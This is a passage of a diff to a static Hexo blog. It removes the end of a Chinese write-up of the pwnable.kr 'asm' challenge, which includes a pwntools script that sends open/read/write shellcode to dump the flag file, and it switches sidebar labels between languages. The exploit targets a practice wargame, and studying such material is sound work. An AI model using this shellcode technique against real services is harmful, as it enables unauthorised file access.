shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')</span><br><span class="line">shellcode += shellcraft.open('rsp', 0, 0)</span><br><span class="line">shellcode += shellcraft.read('rax', 'rsp', 100)</span><br><span class="line">shellcode += shellcraft.write(1, 'rsp', 100)</span><br><span class="line"></span><br><span class="line">p.recvuntil('shellcode: ')</span><br><span class="line">p.send(<span class="keyword">asm</span>(shellcode))</span><br><span class="line">print p.recvline()</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/05/07/pwnable-kr8-asm/3.GIF" alt=""></p>
-<h1 id="手写简易shellcode"><a href="#手写简易shellcode" class="headerlink" title="手写简易shellcode"></a>手写简易shellcode</h1><p><a href="http://blog.nsfocus.net/simple-realization-hand-handle-shellcode-detailed-explanation/" target="_blank" rel="noopener">http://blog.nsfocus.net/simple-realization-hand-handle-shellcode-detailed-explanation/</a></p>
-<hr>
-<p>参考网址<br><a href="https://www.cnblogs.com/p4nda/p/7169456.html" target="_blank" rel="noopener">https://www.cnblogs.com/p4nda/p/7169456.html</a><br><a href="https://blog.csdn.net/pwd_3/article/details/78108610" target="_blank" rel="noopener">pwnable之asm</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3483,8 +3442,8 @@ exp：<br>
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">87</span>
-                    <span class="site-state-item-name">Artikel</span>
+                    <span class="site-state-item-count">89</span>
+                    <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
               
@@ -3521,7 +3480,7 @@ exp：<br>
                       
                     
                     <span class="site-state-item-count">12</span>
-                    <span class="site-state-item-name">Kategorien</span>
+                    <span class="site-state-item-name">categorie</span>
                   </a>
                 </div>
               
@@ -3573,7 +3532,7 @@ exp：<br>
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
 
 
 
@@ -3581,7 +3540,7 @@ exp：<br>
 
 
 
-  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.7.0</div>
+  <div class="theme-info">Tema – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.7.0</div>
 
 
 
